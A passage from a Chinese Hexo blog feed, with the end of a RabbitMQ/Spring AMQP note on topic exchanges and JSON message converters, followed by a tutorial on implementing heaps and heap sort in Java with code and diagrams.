RoutingKey 只要有一个可以对应就可以匹配成功</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;*.news&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenTopicQueue2</span><span class="params">(String message)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue2的消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="五、消息转换器"><a href="#五、消息转换器" class="headerlink" title="五、消息转换器"></a>五、消息转换器</h1><p>在发送信息到RabbitMQ时，Spring会把发送的消息序列化为字节发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。</p>
<p>默认情况下，Spring采用的就是JDK序列化。众所周知，JDK序列化存在下列问题：</p>
<ul>
<li>数据体积过大</li>
<li>有安全漏洞</li>
<li>可读性差</li>
</ul>
<h2 id="1-默认转换器"><a href="#1-默认转换器" class="headerlink" title="1. 默认转换器"></a>1. 默认转换器</h2><ul>
<li>新建一个实体类对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserEntity</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>消息发送</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSendObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">queueName</span> <span class="operator">=</span> <span class="string">&quot;hello.queue&quot;</span>;</span><br><span class="line">    <span class="type">UserEntity</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserEntity</span>();</span><br><span class="line">    user.setName(<span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">    user.setAge(<span class="number">20</span>);</span><br><span class="line">    rabbitTemplate.convertAndSend(queueName, user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>查看控制台<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815125857.png" alt=" "></li>
</ul>
<p>显然，JDK序列化方式并不合适。我们希望消息体的体积更小、可读性更高，因此可以使用JSON方式来做序列化和反序列化。</p>
<h2 id="2-配置JSON转换器"><a href="#2-配置JSON转换器" class="headerlink" title="2. 配置JSON转换器"></a>2. 配置JSON转换器</h2><ul>
<li>在 publisher 模块和 consumer 模块都引入依赖：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>配置消息转换器</li>
</ul>
<p>在启动类上加上一个 Bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MessageConverter <span class="title function_">jsonMessageConverter</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>消息队列</tag>
        <tag>RabbitMQ</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-堆</title>
    <url>/posts/7c236f69.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>堆是计算机科学中一类特殊的数据结构的统称，堆通常可以被看做是一棵完全二叉树的数组对象。</p>
<blockquote>
<p><strong>堆的特性：</strong></p>
<ol>
<li>它是完全二叉树，除了树的最后一层结点不需要是满的，其它的每一层从左到右都是满的，如果最后一层结点不是满的，那么要求左满右不满。  <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142226.png" alt="  "></li>
</ol>
<hr>
<ol start="2">
<li>它通常用数组来实现。并且从<code>索引 1</code> 开始存储，即索引 0 直接废弃。具体方法就是将二叉树的结点按照层级顺序放入数组中，根结点在位置 1，它的子结点在位置 2 和 3，而子结点的子结点则分别在位置 4, 5 , 6 和 7，以此类推。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142252.png" alt="  "><br>如果一个结点的位置为 <code>k</code>，则它的父结点（根节点没有父结点）的位置为<code>[k/2]</code>，而它的两个子结点的位置则分别为<code>2k</code>和<code>2k+1</code>。这样，在不使用指针的情况下，我们也可以通过计算数组的索引在树中上下移动。</li>
</ol>
<hr>
<ol start="3">
<li>每个结点都（大于或小于）等于它的两个子结点。这里要注意堆中仅仅规定了每个结点（大于或小于）等于它的两个子结点，但这两个子结点的顺序并没有做规定，跟二叉查找树是有区别的。</li>
</ol>
<hr>
<ol start="4">
<li>上述提到的结点需要（大于或小于）等于它的两个子节点，是根据堆的类别来判断的。将根节点最大的堆叫做最大堆或大根堆，结点需要大于等于它的两个子结点；根节点最小的堆叫做最小堆或小根堆，结点需要小于等于它的两个子结点。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142255.png" alt="  "></li>
</ol>
</blockquote>
<hr>
<h1 id="二、堆的实现"><a href="#二、堆的实现" class="headerlink" title="二、堆的实现"></a>二、堆的实现</h1><p><strong>堆的API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142303.png" alt="**  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Heap</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储堆中的元素</span></span><br><span class="line">    <span class="keyword">private</span> T[] items;</span><br><span class="line">    <span class="comment">// 记录堆中元素的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Heap</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.items = (T[]) <span class="keyword">new</span> <span class="title class_">Comparable</span>[capacity + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断堆中索引i处的元素是否小于索引j处的元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">less</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items[i].compareTo(items[j]) &lt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 交换堆中i索引和j索引处的值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">temp</span> <span class="operator">=</span> items[i];</span><br><span class="line">        items[i] = items[j];</span><br><span class="line">        items[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 往堆中插入一个元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用上浮算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除堆中最值并返回</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">delFirst</span><span class="params">()</span>&#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用下沉算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（1）堆的插入"><a href="#（1）堆的插入" class="headerlink" title="（1）堆的插入"></a>（1）堆的插入</h2><p>堆是用数组完成数据元素的存储的，我们往数组中从索引 1 处开始，依次往后存放数据，但是堆中对元素的顺序是有要求的，每一个结点的数据要（大于或小于）等于它的两个子结点的数据，所以每次插入一个元素，都会使得堆中的数据顺序变乱，这个时候我们就需要通过一些方法让刚才插入的这个数据放入到合适的位置。</p>
<p><strong>以下图例根据大根堆为例</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142306.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142308.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142310.png" alt="  "></p>
<hr>
<p>所以，如果往堆中新插入元素，我们只需要不断的比较新结点 a[k] 和它的父结点 a[k&#x2F;2] 的大小，然后根据结果完成数据元素的交换，就可以完成堆的有序调整。这里就设计到堆的上浮操作，等会再细谈。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 往堆中插入一个元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span>&#123;</span><br><span class="line">	<span class="comment">// 先将新元素加入堆</span></span><br><span class="line">	items[++ N] = t;</span><br><span class="line">	<span class="comment">// 再对这个元素进行上浮操作</span></span><br><span class="line">	swim(N);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="（2）删除根节点"><a href="#（2）删除根节点" class="headerlink" title="（2）删除根节点"></a>（2）删除根节点</h2><p>由堆的特性我们可以知道，索引1处的元素，也就是根结点。当我们把根结点的元素删除后，堆的顺序就乱了，那么我们应该怎么删除呢？</p>
<blockquote>
<p><strong>思路：</strong></p>
<ol>
<li>交换根节点与最后一个元素</li>
<li>把末尾的根节点删除</li>
<li>对新的根节点进行下沉操作，使之处于正确的位置</li>
</ol>
</blockquote>
<p><strong>这里又提到了一个下沉操作，我们还是以大根堆为例，如图所示。</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142313.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142315.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142317.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142318.png" alt="  "></p>
<hr>
<p>所以，当需要删除最值时，只需要将最后一个元素放到索引 1 处，并不断的拿着当前结点 a[k] 与它的子结点 a[2k]和 a[2k+1] 中的（较大者或较小者，根据大根堆。小根堆判断）交换位置，即可完成堆的有序调整。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除堆中最值并返回</span></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">delFirst</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">T</span> <span class="variable">first</span> <span class="operator">=</span> items[<span class="number">1</span>];</span><br><span class="line">	<span class="comment">// 交换索引1处的元素和最大索引处的元素，</span></span><br><span class="line">	<span class="comment">// 让完全二叉树中最右侧的元素变为临时根结点</span></span><br><span class="line">	exch(<span class="number">1</span>, N);</span><br><span class="line">	<span class="comment">// 最大索引处的元素删除掉</span></span><br><span class="line">	items[N] = <span class="literal">null</span>;</span><br><span class="line">	<span class="comment">// 元素个数-1</span></span><br><span class="line">	N --;</span><br><span class="line">	<span class="comment">// 通过下沉调整堆，让堆重新有序</span></span><br><span class="line">	sink(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> first ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="（3）上浮操作"><a href="#（3）上浮操作" class="headerlink" title="（3）上浮操作"></a>（3）上浮操作</h2><h3 id="①-大根堆的上浮"><a href="#①-大根堆的上浮" class="headerlink" title="① 大根堆的上浮"></a>① 大根堆的上浮</h3><blockquote>
<p><strong>思路：</strong></p>
<ol>
<li>确定需要上浮元素的下标 <code>k</code></li>
<li>当 <code>k &gt; 1</code>时，比较 <code>item[k]</code> 与 <code>item[k / 2]</code> 的大小</li>
</ol>
<ul>
<li>若 <code>item[k] &gt; item[k / 2]</code>，交换两者位置，<code>k = k / 2</code></li>
<li>若 <code>item[k] &lt;= item[k / 2]</code>，上浮结束</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142321.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142324.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142326.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142328.png" alt="  "></p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用上浮算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">	<span class="comment">// 通过循环，不断的比较当前结点的值和其父结点的值</span></span><br><span class="line">	<span class="keyword">while</span>(k &gt; <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果发现父结点的值比当前结点的值小，则交换位置</span></span><br><span class="line">		<span class="keyword">if</span> (less(k / <span class="number">2</span>, k))&#123;</span><br><span class="line">			exch(k / <span class="number">2</span>, k);</span><br><span class="line">		&#125;</span><br><span class="line">		k /= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="②-小根堆的上浮"><a href="#②-小根堆的上浮" class="headerlink" title="② 小根堆的上浮"></a>② 小根堆的上浮</h3><blockquote>
<p><strong>思路：</strong></p>
<ol>
<li>确定需要上浮元素的下标 <code>k</code></li>
<li>当 <code>k &gt; 1</code>时，比较 <code>item[k]</code> 与 <code>item[k / 2]</code> 的大小</li>
</ol>
<ul>
<li>若 <code>item[k] &lt; item[k / 2]</code>，交换两者位置，<code>k = k / 2</code></li>
<li>若 <code>item[k] &gt;= item[k / 2]</code>，上浮结束</li>
</ul>
</blockquote>
<p>这里实际就以大根堆的上浮操作是差不多的，只是比较当前结点与父结点的标准不同罢了。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142331.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142333.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142336.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142339.png" alt="  "></p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用上浮算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">	<span class="comment">// 通过循环，不断的比较当前结点的值和其父结点的值</span></span><br><span class="line">	<span class="keyword">while</span>(k &gt; <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果发现当前结点的值比父结点的值小，则交换位置</span></span><br><span class="line">		<span class="keyword">if</span> (less(k, k / <span class="number">2</span>))&#123;</span><br><span class="line">			exch(k, k / <span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		k /= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h2 id="（4）下沉操作"><a href="#（4）下沉操作" class="headerlink" title="（4）下沉操作"></a>（4）下沉操作</h2><h3 id="①-大根堆的下沉"><a href="#①-大根堆的下沉" class="headerlink" title="① 大根堆的下沉"></a>① 大根堆的下沉</h3><blockquote>
<p><strong>思路：</strong></p>
<ol>
<li>确定需要下沉元素的下标 <code>k</code></li>
<li>当 <code>k * 2 &lt;= N</code> （N 为堆中元素个数）时，比较 <code>item[k]</code> 与 <code>max&#123; item[k * 2]，item[k * 2 + 1]&#125;</code> 的大小，并记录 <code>item[k * 2]</code>，<code>item[k * 2 + 1]</code> 较大值的下标 <code>maxIndex</code></li>
</ol>
<ul>
<li>若 <code>item[k] &lt; item[maxIndex]</code>，交换两者位置，<code>k = maxIndex</code></li>
<li>若 <code>item[k] &gt;= maxIndex</code>，下沉结束</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142342.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142343.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142345.png" alt="  "></p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用下沉算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	通过循环不断的对比当前 k 结点和</span></span><br><span class="line"><span class="comment">	其左子结点 2 * k 以及右子结点 2 * k + 1</span></span><br><span class="line"><span class="comment">	处中的较大值的元素大小</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">2</span> * k &lt;= N)&#123;</span><br><span class="line">		<span class="comment">// 获取当前结点的子结点中的较大结点</span></span><br><span class="line">		<span class="comment">// 记录较大结点所在的索引</span></span><br><span class="line">		<span class="type">int</span> maxIndex;</span><br><span class="line">		<span class="comment">// 判断是否有右孩子结点</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">2</span> * k + <span class="number">1</span> &lt;= N)&#123;</span><br><span class="line">			maxIndex = less(<span class="number">2</span> * k,<span class="number">2</span> * k + <span class="number">1</span>) ? <span class="number">2</span> * k + <span class="number">1</span> : <span class="number">2</span> * k;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			maxIndex = <span class="number">2</span> * k;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 比较当前结点和较大结点的值</span></span><br><span class="line">		<span class="keyword">if</span> (!less(k, maxIndex))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 交换 k 索引处的值和 maxIndex 索引处的值</span></span><br><span class="line">		exch(k, maxIndex);</span><br><span class="line">		<span class="comment">// 变换k的值</span></span><br><span class="line">		k = maxIndex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="②-小根堆的下沉"><a href="#②-小根堆的下沉" class="headerlink" title="② 小根堆的下沉"></a>② 小根堆的下沉</h3><blockquote>
<p><strong>思路：</strong></p>
<ol>
<li>确定需要下沉元素的下标 <code>k</code></li>
<li>当 <code>k * 2 &lt;= N</code> （N 为堆中元素个数）时，比较 <code>item[k]</code> 与 <code>min&#123; item[k * 2]，item[k * 2 + 1]&#125;</code> 的大小，并记录 <code>item[k * 2]</code>，<code>item[k * 2 + 1]</code> 较小值的下标 <code>minIndex</code></li>
</ol>
<ul>
<li>若 <code>item[k] &gt; item[maxIndex]</code>，交换两者位置，<code>k = minIndex</code></li>
<li>若 <code>item[k] &lt;= maxIndex</code>，下沉结束</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142347.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142349.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142350.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142352.png" alt="  "></p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用下沉算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	通过循环不断的对比当前 k 结点和</span></span><br><span class="line"><span class="comment">	其左子结点 2 * k 以及右子结点 2 * k + 1</span></span><br><span class="line"><span class="comment">	处中的较小值的元素大小</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">2</span> * k &lt;= N)&#123;</span><br><span class="line">		<span class="comment">// 获取当前结点的子结点中的较小结点</span></span><br><span class="line">		<span class="comment">// 记录较小结点所在的索引</span></span><br><span class="line">		<span class="type">int</span> minIndex;</span><br><span class="line">		<span class="comment">// 判断是否有右孩子结点</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">2</span> * k + <span class="number">1</span> &lt;= N)&#123;</span><br><span class="line">			minIndex = less(<span class="number">2</span> * k,<span class="number">2</span> * k + <span class="number">1</span>) ? <span class="number">2</span> * k : <span class="number">2</span> * k + <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			minIndex = <span class="number">2</span> * k;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 比较当前结点和较小结点的值</span></span><br><span class="line">		<span class="keyword">if</span> (less(k, minIndex))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 交换 k 索引处的值和 minIndex 索引处的值</span></span><br><span class="line">		exch(k, minIndex);</span><br><span class="line">		<span class="comment">// 变换k的值</span></span><br><span class="line">		k = minIndex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（5）堆的构造"><a href="#（5）堆的构造" class="headerlink" title="（5）堆的构造"></a>（5）堆的构造</h2><p>堆的构造，最直观的想法就是另外再创建一个新数组，然后从左往右遍历原数组，每得到一个元素后，添加到新数组中，并通过上浮，对堆进行调整，最后新的数组就是一个堆。<br>上述的方式虽然很直观，也很简单，但是我们可以用更聪明一点的办法完成它。创建一个新数组，把原数组<code>[0 ~ length -1]</code>的数据拷贝到新数组的 <code>[1 ~ length]</code>处，再从新数组长度的<code>一半</code>处开始往 <code>1</code> 索引处扫描（从右往左），然后对扫描到的每一个元素做<code>下沉</code>调整即可。</p>
<p><strong>以下代码以构建大根堆为例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Comparable[] createHeap(Comparable[] source) &#123;</span><br><span class="line">	Comparable[] heap = <span class="keyword">new</span> <span class="title class_">Comparable</span>[source.length + <span class="number">1</span>];</span><br><span class="line">	<span class="comment">// 把source中的元素拷贝到heap中，heap中的元素就形成一个无序的堆</span></span><br><span class="line">	System.arraycopy(source,<span class="number">0</span>,heap,<span class="number">1</span>,source.length);</span><br><span class="line">	<span class="comment">// 对堆中的元素做下沉调整(从长度的一半处开始，往索引1处扫描)</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (heap.length)/<span class="number">2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">		sink(heap,i,heap.length-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> heap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在heap堆中，对target处的元素做下沉，范围是0~range</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(Comparable[] heap, <span class="type">int</span> target, <span class="type">int</span> range)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">2</span> * target &lt;= range)&#123;</span><br><span class="line">		<span class="comment">// 找出当前结点的较大的子结点</span></span><br><span class="line">		<span class="type">int</span> maxIndex;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">2</span>*target+<span class="number">1</span>&lt;=range)&#123;</span><br><span class="line">		<span class="keyword">if</span> (less(heap,<span class="number">2</span>*target,<span class="number">2</span>*target+<span class="number">1</span>))&#123;</span><br><span class="line">			maxIndex = <span class="number">2</span>*target+<span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			maxIndex = <span class="number">2</span>*target;</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			maxIndex = <span class="number">2</span>*target;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//2.比较当前结点的值和较大子结点的值</span></span><br><span class="line">		<span class="keyword">if</span> (!less(heap,target, maxIndex))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		exch(heap,target, maxIndex);</span><br><span class="line">		target = maxIndex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（6）堆排序"><a href="#（6）堆排序" class="headerlink" title="（6）堆排序"></a>（6）堆排序</h2><p>这里以实现数据的升序为例</p>
<blockquote>
<p><strong>实现步骤：</strong></p>
<ol>
<li>构造堆</li>
<li>得到堆顶元素，这个值就是最大值</li>
<li>交换堆顶元素和数组中的最后一个元素，此时所有元素中的最大元素已经放到合适的位置</li>
<li>对堆进行调整，重新让除了最后一个元素的剩余元素中的最大值放到堆顶</li>
<li>重复2~4这个步骤，直到堆中剩一个元素为止</li>
</ol>
</blockquote>
<p>对于堆的构造，上述已经谈到，对构造好的堆，我们只需要做类似于堆的删除操作，就可以完成排序。</p>
<ol>
<li>将堆顶元素和堆中最后一个元素交换位置；</li>
<li>通过对堆顶元素下沉调整堆，把最大的元素放到堆顶(此时最后一个元素不参与堆的调整，因为最大的数据已经到了数组的最右边)</li>
<li>重复1~2步骤，直到堆中剩最后一个元素。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对source数组中的数据从小到大排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Comparable[] source)</span> &#123;</span><br><span class="line">        <span class="comment">// 构建堆</span></span><br><span class="line">        Comparable[] heap = createHeap(source);</span><br><span class="line">        <span class="comment">// 定义一个变量，记录未排序的元素中最大的索引</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> heap.length - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 通过循环，交换1索引处的元素和排序的元素中最大的索引处的元素</span></span><br><span class="line">        <span class="keyword">while</span>(N != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 交换元素</span></span><br><span class="line">            exch(heap,<span class="number">1</span>, N);</span><br><span class="line">            <span class="comment">// 